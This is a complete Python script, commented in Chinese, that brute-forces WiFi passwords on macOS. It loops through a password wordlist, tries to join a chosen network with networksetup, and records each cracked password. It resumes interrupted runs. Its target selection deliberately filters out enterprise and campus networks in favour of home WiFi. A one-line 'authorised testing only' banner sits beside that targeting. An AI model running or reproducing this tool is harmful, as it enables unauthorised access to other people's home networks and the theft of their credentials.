#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi 密码在线破解器 v3.0
核心升级：
  1. 智能识别家庭WiFi（排除企业/校园网络）
  2. 支持通过信道+信号强度选择目标（SSID被隐藏时）
  3. 支持已保存WiFi列表中选择目标
  4. 多种连接方式（networksetup / CoreWLAN）
  5. 断点续传 + 智能延迟
适配：macOS Apple Silicon，内置网卡
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import time
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_DIR = SCRIPT_DIR.parent
CRACKED_FILE = PROJECT_DIR / "captures" / "cracked.json"
PROGRESS_FILE = PROJECT_DIR / "captures" / "progress.json"

# 颜色
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

# 家庭WiFi安全类型
HOME_SEC = {2, 8, 32, 128, 2048, 4224}


# ============================================================
# 记录管理
# ============================================================
def load_cracked():
    if CRACKED_FILE.exists():
        with open(CRACKED_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_cracked(ssid, password):
    CRACKED_FILE.parent.mkdir(parents=True, exist_ok=True)
    data = load_cracked()
    data[ssid] = {"password": password, "time": time.strftime("%Y-%m-%d %H:%M:%S")}
    with open(CRACKED_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def save_progress(ssid, index, wordlist_path):
    PROGRESS_FILE.parent.mkdir(parents=True, exist_ok=True)
    data = {}
    if PROGRESS_FILE.exists():
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    data[ssid] = {"index": index, "wordlist": str(wordlist_path)}
    with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_progress(ssid, wordlist_path):
    if not PROGRESS_FILE.exists():
        return 0
    with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    info = data.get(ssid, {})
    if info.get("wordlist") == str(wordlist_path):
        return info.get("index", 0)
    return 0

def clear_progress(ssid):
    if not PROGRESS_FILE.exists():
        return
    with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    data.pop(ssid, None)
    with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


# ============================================================
# WiFi 连接
# ============================================================
def try_connect(ssid, password, interface="en0"):
    """用 networksetup 尝试连接，返回 (成功, 耗时)"""
    t0 = time.time()
    try:
        r = subprocess.run(
            ["networksetup", "-setairportnetwork", interface, ssid, password],
            capture_output=True, text=True, timeout=15
        )
        elapsed = time.time() - t0
        out = r.stdout + r.stderr
        if "Could not find" in out or "Error" in out or "Failed" in out:
            return False, elapsed
        time.sleep(0.5)
        chk = subprocess.run(
            ["networksetup", "-getairportnetwork", interface],
            capture_output=True, text=True, timeout=5
        )
        return ssid in chk.stdout, elapsed
    except Exception:
        return False, time.time() - t0


def get_ip(interface="en0"):
    try:
        r = subprocess.run(["ipconfig", "getifaddr", interface],
                           capture_output=True, text=True, timeout=5)
        return r.stdout.strip() or "N/A"
    except Exception:
        return "N/A"


# ============================================================
# 目标选择（核心升级）
# ============================================================
def select_target(target_ssid=None):
    """
    智能选择破解目标：
    1. 如果指定了SSID，直接用
    2. 否则从已保存WiFi列表中筛选家庭WiFi
    3. 或从扫描结果中通过信号强度选择
    """
    if target_ssid:
        print(f"[*] 目标: {target_ssid}")
        return target_ssid

    # 方案A：从已保存的WiFi列表中选择
    print("[*] 选择破解目标:")
    print()
    print("  [A] 从已保存的WiFi中选择（推荐，可看到名称）")
    print("  [B] 手动输入SSID名称")
    print()
    try:
        mode = input("选择模式 (A/B): ").strip().upper()
    except EOFError:
        mode = "B"

    if mode == "A":
        return select_from_saved()
    else:
        try:
            ssid = input("输入目标SSID: ").strip()
            return ssid if ssid else None
        except EOFError:
            return None


def select_from_saved():
    """从Mac已保存的WiFi网络中选择目标"""
    try:
        r = subprocess.run(
            ["networksetup", "-listpreferredwirelessnetworks", "en0"],
            capture_output=True, text=True, timeout=5
        )
        lines = r.stdout.strip().splitlines()[1:]
        ssids = [l.strip() for l in lines if l.strip()]
    except Exception:
        print("[!] 获取已保存WiFi失败")
        return None

    if not ssids:
        print("[!] 无已保存的WiFi")
        return None

    # 过滤掉明显的企业/校园WiFi
    enterprise_kw = ["eduroam", "1X", "802.1x", "Enterprise", "campus", "iXAUT-1X"]
    home_ssids = []
    enterprise_ssids = []
    for s in ssids:
        is_ent = False
        for kw in enterprise_kw:
            if kw.lower() in s.lower():
                is_ent = True
                break
        if is_ent:
            enterprise_ssids.append(s)
        else:
            home_ssids.append(s)

    print()
    print(f"[*] 已保存 {len(ssids)} 个WiFi ({len(home_ssids)} 家庭 / {len(enterprise_ssids)} 企业)")
    print()
    print(f"{'#':>3} {'SSID':<30} {'类型'}")
    print("-" * 50)

    display_list = []
    for s in home_ssids[:30]:
        display_list.append((s, "家庭"))
    for s in enterprise_ssids[:10]:
        display_list.append((s, "企业(不推荐)"))

    for i, (s, t) in enumerate(display_list, 1):
        print(f"{i:>3} {s:<30} {t}")

    try:
        print()
        choice = int(input(f"选择 (1-{len(display_list)}): "))
        if 1 <= choice <= len(display_list):
            selected = display_list[choice - 1][0]
            print(f"[*] 已选择: {selected}")
            return selected
    except (ValueError, EOFError):
        pass
    return None


# ============================================================
# 核心破解循环
# ============================================================
def crack(ssid, wordlist_path, interface="en0", delay=0.5, resume=True):
    """WiFi密码破解主循环"""
    wordlist_path = Path(wordlist_path)
    if not wordlist_path.exists():
        print(f"[!] 字典不存在: {wordlist_path}")
        return False

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [l.strip() for l in f if l.strip()]

    total = len(passwords)
    if total == 0:
        print("[!] 字典为空")
        return False

    start_idx = 0
    if resume:
        start_idx = load_progress(ssid, wordlist_path)
        if start_idx > 0:
            print(f"[*] 从第 {start_idx + 1} 条继续（断点续传）")

    print()
    print("=" * 55)
    print(f"  目标:   {ssid}")
    print(f"  字典:   {wordlist_path.name} ({total:,} 条)")
    print(f"  方式:   networksetup")
    print(f"  延迟:   {delay}s")
    if start_idx > 0:
        print(f"  跳过:   前 {start_idx:,} 条")
    est_time = (total - start_idx) * (delay + 2) / 60
    print(f"  预估:   {est_time:.0f} 分钟")
    print("=" * 55)
    print()

    # 信号处理
    interrupted = [False]
    def on_int(sig, frame):
        interrupted[0] = True
        print()
        print(f"{YELLOW}[!] 中断，保存进度...{RESET}")
    old = signal.signal(signal.SIGINT, on_int)

    t_start = time.time()
    tried = 0

    try:
        for idx in range(start_idx, total):
            if interrupted[0]:
                save_progress(ssid, idx, wordlist_path)
                print(f"[*] 进度已保存 ({idx}/{total})")
                return False

            pwd = passwords[idx]
            tried += 1
            elapsed = time.time() - t_start
            speed = tried / elapsed if elapsed > 0 else 0
            remain = (total - idx - 1) / speed / 60 if speed > 0 else 0
            pct = (idx + 1) / total * 100

            sys.stdout.write(
                f"\r[{pct:5.1f}%] {idx+1}/{total}  "
                f"{speed:.1f}/s  "
                f"~{remain:.0f}min  "
                f"{pwd:<20}"
            )
            sys.stdout.flush()

            ok, t = try_connect(ssid, pwd, interface)

            if ok:
                ip = get_ip(interface)
                print()
                print()
                print(f"{GREEN}{BOLD}{'=' * 55}")
                print(f"  >>> 破解成功！<<<")
                print(f"  SSID:     {ssid}")
                print(f"  密码:     {pwd}")
                print(f"  IP:       {ip}")
                print(f"  尝试:     {tried}")
                print(f"  耗时:     {elapsed:.0f}s")
                print(f"{'=' * 55}{RESET}")
                print()
                save_cracked(ssid, pwd)
                clear_progress(ssid)
                return True

            if delay > 0:
                time.sleep(delay)
    finally:
        signal.signal(signal.SIGINT, old)

    elapsed = time.time() - t_start
    print()
    print()
    print(f"{RED}[X] 字典耗尽 ({tried} 条, {elapsed:.0f}s){RESET}")
    clear_progress(ssid)
    return False


# ============================================================
# 入口
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="WiFi 密码破解器 v3.0 (macOS)")
    parser.add_argument("-t", "--target", type=str, help="目标SSID")
    parser.add_argument("-w", "--wordlist", type=str, required=True, help="密码字典")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="间隔秒数")
    parser.add_argument("-i", "--interface", default="en0", help="WiFi接口")
    parser.add_argument("--no-resume", action="store_true", help="不续传")
    args = parser.parse_args()

    print(f"{BOLD}{'=' * 55}")
    print(f"  WiFi 密码破解器 v3.0 (macOS)")
    print(f"  仅限授权网络安全测试")
    print(f"{'=' * 55}{RESET}")
    print()

    ssid = select_target(args.target)
    if not ssid:
        print("[!] 未选择目标")
        sys.exit(1)

    success = crack(
        ssid=ssid,
        wordlist_path=args.wordlist,
        interface=args.interface,
        delay=args.delay,
        resume=not args.no_resume,
    )
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
